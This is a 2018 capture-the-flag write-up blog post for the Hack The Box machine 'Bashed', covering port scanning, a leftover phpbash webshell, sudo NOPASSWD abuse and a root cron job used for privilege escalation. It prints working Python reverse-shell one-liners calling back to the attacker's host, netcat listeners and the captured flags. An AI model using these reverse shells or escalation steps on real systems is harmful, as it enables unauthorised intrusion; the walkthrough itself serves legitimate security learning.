---
id: 10
title: 'Bashed &#8211; Hackthebox'
date: 2018-04-04T13:17:51+01:00
author: rowbot
layout: post
guid: https://offsecnewbie.wordpress.com/?p=10
permalink: /2018/04/04/bashed-hack-the-box/
timeline_notification:
  - "1522847872"
image: /wp-content/uploads/2018/04/bashed-1.png
categories:
  - Hackthebox
---
<p style="text-align: justify;">
  <strong>Skills Required</strong><br /> Basic knowledge of Linux<br /> Enumerating ports and services
</p>

<p style="text-align: justify;">
  <strong>Skills Learned</strong><br /> Very Basic scripting<br /> Exploiting NOPASSWD<br /> Exploiting cron jobs
</p>

<p style="text-align: justify;">
  START
</p>

<p style="text-align: justify;">
  I checked to see what ports were open:
</p>

<p style="text-align: justify;">
  Scanned all ports, scan with default NSE scripts (Considered useful for discovery and safe) and what version a service is running on that port.
</p>

<pre>[root:~]# nmap -p- -sC -sV 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-04 14:21 BST
Nmap scan report for 10.10.10.68
Host is up, received echo-reply ttl 63 (0.034s latency).
Not shown: 61550 closed ports, 3984 filtered ports
Reason: 61550 resets and 3984 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON VERSION
80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.52 seconds</pre>

<p style="text-align: justify;">
  Result: Port 80 is open and running Apache. There is a website called Arrexel&#8217;s Development Site.
</p>

<p style="text-align: justify;">
  Seeing as port 80 is open I ran this to perform HTTP enumeration using the http-enum nse script. I did this after I completed the box to see what what the command would output. From the looks of it if i did this initially i could have skipped the next step &#8211; using GoBuster.
</p>

<pre>[root:~]# nmap -Pn -p 80 --script http-enum 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-04 12:48 BST 
Nmap scan report for 10.10.10.68 
Host is up, received user-set (0.032s latency).
PORT STATE SERVICE REASON 
80/tcp open http syn-ack ttl 63 
| http-enum: 
| /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_ /uploads/: Potentially interesting folder
Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds</pre>

<p style="text-align: justify;">
  You see similar results using GoBuster.
</p>

<pre>[root:~]# nmap -Pn -p 80 --script http-enum 10.10.10.68
Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-04 12:48 BST 
Nmap scan report for 10.10.10.68 
Host is up, received user-set (0.032s latency).
PORT STATE SERVICE REASON 
80/tcp open http syn-ack ttl 63 
| http-enum: 
| /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
| /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_ /uploads/: Potentially interesting folder
Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds</pre>

<p style="text-align: justify;">
  Time to check out those directories. A dev directory is always interesting!!<img class="alignnone size-full wp-image-16" src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/dev.png?resize=518%2C360" alt="dev" width="518" height="360" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/dev.png?w=518 518w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/dev.png?resize=300%2C208 300w" sizes="(max-width: 518px) 100vw, 518px" data-recalc-dims="1" />
</p>

<p style="text-align: justify;">
  Clicking on phpbash.php gave me a webshell. I wonder what i can do with this? My initial thoughts are uploading a reverse proxy.
</p>

<p style="text-align: justify;">
  <img class="alignnone size-full wp-image-13" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?resize=680%2C427" alt="phpbash" width="680" height="427" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?w=1869 1869w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?resize=300%2C188 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?resize=768%2C482 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?resize=1024%2C643 1024w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/04/phpbash.png?w=1360 1360w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" />
</p>

<pre>www-data@bashed:/var/www/html/dev# whoami
www-datawww-data@bashed:/var/www/html/dev# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/var/www/html/dev# ls -l
total 20
-rw-r-xr-x 1 root root 4688 Dec 4 12:21 phpbash.min.php
-rw-r-xr-x 1 root root 8280 Nov 30 23:56 phpbash.php</pre>

<div class="console" style="text-align: justify;">
  <div>
    I&#8217;m logged on as www-data and have basic user privileges. I did sudo -l to see what other privileges i have access to. I am able to run commands as a user scriptmanager without a password.
  </div>
</div>

<pre>www-data@bashed:/var/www/html/dev# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL</pre>

<div style="text-align: justify;">
  Interesting&#8230;
</div>

<div style="text-align: justify;">
  Based on the /home directories there are 2 basic users on this box.
</div>

<pre>www-data@bashed:/var/www/html/dev# cd /home
www-data@bashed:/home# ls
arrexel
scriptmanager</pre>

<div style="text-align: justify;">
  Lets see if I can get the user flag from this shell
</div>

<pre>www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# cat user.txt
2c281f318555dbc1b856957c7147bfc1</pre>

<div style="text-align: justify;">
  User flag captured!
</div>

<div style="text-align: justify;">
  Using this shell (through firefox) was not easy. So i wanted see if i can get a reverse shell. I started a listener on my kali machine
</div>

<pre>[root:~]# nc -nlvp 5555
listening on [any] 5555 ...</pre>

<div style="text-align: justify;">
  And on the Firefox webshell on Bashed I ran
</div>

<pre>www-data@bashed:/# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.234",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</pre>

<div style="text-align: justify;">
  Back on my kali machine i now had shell as www-data
</div>

<pre>[root:~]# nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.68] 39788
/bin/sh: 0: can't access tty; job control turned off
$</pre>

It looks horrible and quite limited. I spawned a new tty shell by running the following

<pre>python -c 'import pty;pty.spawn("/bin/bash")'</pre>

<div style="text-align: justify;">
  New prompt
</div>

<pre>www-data@bashed:/var/www/html/dev$</pre>

<div style="text-align: justify;">
  That looks a bit better though it doesnt really give us more functionality ( that i can tell ).
</div>

<div style="text-align: justify;">
  After exploring the box a bit i found this really interesting
</div>

<pre>www-data@bashed:/$ ls -l
ls -l
total 80
drwxr-xr-x 2 root root 4096 Dec 4 11:22 bin
drwxr-xr-x 3 root root 4096 Dec 4 11:17 boot
drwxr-xr-x 19 root root 4240 Apr 1 14:08 dev
drwxr-xr-x 89 root root 4096 Dec 4 17:09 etc
drwxr-xr-x 4 root root 4096 Dec 4 13:53 home
lrwxrwxrwx 1 root root 32 Dec 4 11:14 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic
drwxr-xr-x 19 root root 4096 Dec 4 11:16 lib
drwxr-xr-x 2 root root 4096 Dec 4 11:13 lib64
drwx------ 2 root root 16384 Dec 4 11:13 lost+found
drwxr-xr-x 4 root root 4096 Dec 4 11:13 media
drwxr-xr-x 2 root root 4096 Feb 15 2017 mnt
drwxr-xr-x 2 root root 4096 Dec 4 11:18 opt
dr-xr-xr-x 148 root root 0 Apr 1 14:08 proc
drwx------ 3 root root 4096 Dec 4 13:03 root
drwxr-xr-x 18 root root 520 Apr 2 06:25 run
drwxr-xr-x 2 root root 4096 Dec 4 11:18 sbin
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Apr 4 04:26 scripts
drwxr-xr-x 2 root root 4096 Feb 15 2017 srv
dr-xr-xr-x 13 root root 0 Apr 2 04:53 sys
drwxrwxrwt 10 root root 4096 Apr 4 06:57 tmp
drwxr-xr-x 10 root root 4096 Dec 4 11:13 usr
drwxr-xr-x 12 root root 4096 Dec 4 11:20 var
lrwxrwxrwx 1 root root 29 Dec 4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
www-data@bashed:/$</pre>

<div style="text-align: justify;">
  There’s something out of place here. The /scripts directory looks strange. Its not normally a directory that is on the root of a linux file system. Also the user scriptmanager is the only one that has access (excluding root &#8211; root always has access).
</div>

<pre>www-data@bashed:/$ cd scripts
cd scripts
bash: cd: scripts: Permission denied
www-data@bashed:/$</pre>

<div style="text-align: justify;">
  Just to confirm i tried to cd into the directory as www-data and got a permission denied! Dammit! I dont like not getting access to something. I need to think how I can get in.
</div>

<div style="text-align: justify;">
  I then remembered that I can sudo as scriptmanager, let’s use that privilege to view the /scripts directory
</div>

<div style="text-align: justify;">
  <span style="color: #ff0000;">! Remember !</span>
</div>

<pre>User www-data may run the following commands on bashed:
 (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/$ sudo -u scriptmanager ls -al /scripts
total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 18:06 .
drwxr-xr-x 23 root root 4096 Dec 4 13:02 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 17:03 test.py
-rw-r--r-- 1 root root 12 Feb 13 01:45 test.txt</pre>

<div style="text-align: justify;">
  My thoughts at this stage were &#8211; oh no i have to do some scripting! I took a closer look at the 2 files. Test.py is owned by scriptmanager and test.txt is owned by root. I looked inside test.py and test.txt.
</div>

<pre>www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing!")
f.close
www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.txt
testing!</pre>

<div style="text-align: justify;">
  <p>
    It creates a “test.txt” file and write the string “testing!” in it. But why is test.txt is owned by root while test.py is owned by scriptmanager only?
  </p>
  
  <p>
    At this stage i took a guess that there is a root cron job that runs and executes any scripts in the /scripts folder.
  </p>
  
  <p>
    I checked to see what cron jobs were running but I couldn&#8217;t see anything that referenced the /scripts folder.
  </p>
</div>

<pre>www-data@bashed:/$ crontab -l
crontab -l
no crontab for www-data
www-data@bashed:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@bashed:/$</pre>

<div style="text-align: justify;">
  <p>
    After a few days on and off poking around this box. I was confused scared and lonely. I certainly &#8216;Bashed&#8217; my head off a few walls (see what I did there?). I decided to look back at the /scripts folder. I took a guess at thinking there was a cron job that i couldnt see as www-data or scriptmanager that ran any scripts in that folder.
  </p>
</div>

<p style="text-align: justify;">
  I created a tester.py containing the following and ran a netcat listener on port 6666
</p>

<pre>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.234",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.68] 55864
/bin/sh: 0: can't access tty; job control turned off
# whoami
root</pre>

<div>
  <p style="text-align: justify;">
    BOOM!!!!!
  </p>
  
  <p style="text-align: justify;">
    I have to say I didn&#8217;t think this was going to work. For my own sanity i checked to see if there was a cron job that was running which i couldn&#8217;t see as other user. Sure enough
  </p>
</div>

<pre># crontab -l * * * * * cd /scripts; for f in *.py; do python "$f"; done #</pre>

<div>
  <p style="text-align: justify;">
    All that’s left to do now is to capture the root flag
  </p>
</div>

<pre>root@bashed:/scripts# cat /root/root.txt 
cc4f0afe3a1026d402ba10329674a8e2</pre>

<div>
  <p style="text-align: justify;">
    FIN
  </p>
  
  <p style="text-align: justify;">
    Conclusion
  </p>
  
  <p style="text-align: justify;">
    If you made it this far down well done. It was a fun box and I learned quite a bit from it. What I didnt put in this blog was that I used another python reverse shell to log on as scriptmanager as i got fed up typing sudo -u scriptmanager then the command. It became quite a messy procedure after a while. Upon reflection I think it would have been better just to type the sudo -u command when i needed to use it as at times I had multiple shells open and it was hard to keep track of things.
  </p>
  
  <p style="text-align: justify;">
    Enough of my ramblings.
  </p>
</div>